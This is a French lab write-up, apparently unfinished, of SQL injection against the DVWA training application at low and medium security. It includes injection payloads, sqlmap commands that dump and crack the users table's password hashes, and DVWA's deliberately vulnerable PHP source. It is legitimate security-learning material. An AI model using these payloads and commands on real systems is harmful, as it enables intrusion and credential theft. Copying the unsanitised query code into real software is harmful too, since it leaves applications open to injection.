# 1. SQL Injection

Une injection SQL (SQL Injection) est une faille de sécurité exploitée par un attaquant pour exécuter des commandes SQL malveillantes sur une base de données. Elle se produit lorsque des entrées utilisateur ne sont pas correctement validées ou filtrées avant d’être intégrées à une requête SQL. Cela peut permettre à un attaquant de manipuler les requêtes SQL de l'application, exposant ainsi des données sensibles ou compromettant le système

Imaginons un bloc de code vulnérable tout simple :  

```
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password';";
$result = mysqli_query($conn, $query);
```

Le script ci-dessus va utiliser l'input de l'utilisateur et va le concaténer avec le reste de la commande SQL. Cependant il n'y a aucun filtre.  

Ainsi prenons un exemple d'attaque où l'attaquant entre comme nom d'utilisateur `admin' --`  
La requête devient alors :

```
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```

La partie `-- ' AND password = '';` est commenté et la commande restante n'est donc plus que `SELECT * FROM users WHERE username = 'admin'`. Cela accordera donc l'accès à l'utilisateur.

## 1.1 Premier niveau - low

On a une page avec la possibilié d'entrer un id d'utilisateur
![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\1.png)  
Cela nous renvoie l'utilisateur sans le mot de passe.  

On va commencer par essayer une simple injection 

```
admin' OR '1'='1
```

C'est quasiment le même exemple que cité auparavant sauf que l'on rajoute une condition `OR '1'='1` qui est bien sur toujours vrai. Ainsi on va tout afficher puisque la condition est toujours vrai.

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\2.png)  

### sqlmap

On va aussi essayer d'utiliser l'outil `sqlmap` pour scanner le formulaire et voir ce qu'il trouve  
La commande a cette forme :  

```
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low"
```

On note d'ailleurs qu'il y a le cookie de session, ceci est important puisque sinon les requêtes seront redirigés à `login.php`.

On a déja un résultat qui nous indique que la page peut etre injecter.  
![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\3.png)  

On à plusieurs options d'ailleurs :  

- La première est de type `boolean-based blind`, cette technique ajoute une condition booléenne au paramètre afin de determiner si le résultat de la page varie
- La deuxieme est de type `error-based`, cette technique consiste a former une requête SQL invalide afin de voir ce que renvoie le serveur comme message d'erreur. 
- La troisieme méthode que l'on a ici est `UNION query`, cette technique consiste à concaténer la requête executée l'application web par une requête injectée par l'outil via une opération d'union
- Nous avons une quatrième méthode nommée `Time-based blind`, cette technique augmente la durée d'exécution de la requête SQL de l'application web en ajoutant du code SQL effectuant des opérations coûteuses en temps  

Cette commande est relativement simple et ne nous donne pas d'informations sur base de données si ce n'est la manière dont on peux faire les injection  

A l'aide d'une commande plus technique, nous allons essayer d'afficher plus d'information sur la DB

```
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump --fresh-queries
```

Ici nous avons rajouté quelques paramètres, expliquons leurs fonctionnement :  

- `--banner` permet d'afficher la version de la DB
- `--current-user` permet d'afficher le nom de l'utilisateur courant 
- `--current-db` permet d'afficher la DB courante
- `--is-dba` permet d'afficher si l'utilisateur de la DB est admin  
- `--tables` liste les tables
- `--columns` liste les colonnes
- `--dump` permet de récupérer leur contenu (des tables et des colonnes) 

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\4.png)  
Cela nous affiche tous les détail des DB or ici il n'y en a qu'une qui nous interesse, c'est `dvwa`.

Il ne nous reste plus qu'à lister le contenu de ces tables et pour se faire nous allons utiliser un nouveau paramètre  

```
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump -T users -D dvwa --fresh-queries
```

`-T users` permet de choisir la table `users` et `-D dvwa` permet de choisir la DB `dvwa`.

Avec ceci, sqlmap est en mesure d'afficher tous le contenu des tables, ici les utilisateur et le hash de leurs mots de passe

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\5.png)  

Cette fois ci, sqlmap a réussi à déchiffrer tous les hash des mot de passe en plus de les avoir trouver

### php

```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            mysqli_close($GLOBALS["___mysqli_ston"]);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
            #$sqlite_db_connection->enableExceptions(true);

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    } 
}
?>
```

En voyant le code, on remarque qu'il n'y a aucune fonction d'échappement du type `mysqli_real_escape_string()`, la requête est inséré telles quelle ainsi l'injection est particulièrement facile. 

## 1.2 Deuxieme niveau - medium

La principale différence avec le niveau d'avant (du moins que l'on remarque) est le fait que la requête est en `POST` donc pas l'url.

On va donc utiliser une méthode un peu différente pour ce niveau.  
Nous allons combiner l'utilisation de `Burp suite` et `sqlmap` pour avoir une commande simple.  

La première étape est d'ouvrir Burp Suite et d'intercepter la requête POST a l'aide du proxy.

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\6.png)  
Ensuite nous enregistrons le contenu de cette requête dans un fichier texte ici `info.txt` puis nous saissions cette commande  

```
sqlmap -r info.txt -p id
```

Avec cette simple commande, nous sommes en mesure de déterminer les types d'injection comme précedemment. Le `-r` permet à sqlmap de rechercher les informations dans le fichier `info.txt` et le `-p` est le paramètre à attaquer.
![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\7.png)  

Plus qu'à rajouter quelque paramètres pour retrouver les mot de passe des utilisateurs  

```
sqlmap -r info.txt -p id --tables --columns -dump -T users -D dvwa
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\8.png)  

Bingo ! On obtient encore les identifiants

### php

```
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Display values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

On remarque que dans le niveau intermédiaire, il y a déjà un peu plus de contrôle.

- l'utilation de `mysqli_real_escape_string()` : permet de limiter les injections basique comme `'` `"` `;` etc.

Cependant, la requête reste très vulnérable puisque l'id est ajouter directement dans la requete dans vérification. Cela rend la requête vulnérable puisque `$id` pourrait être modifier pour ne pas être un entier

## 1.3 Troisième niveau - hard

## 1.4 Niveau impossible
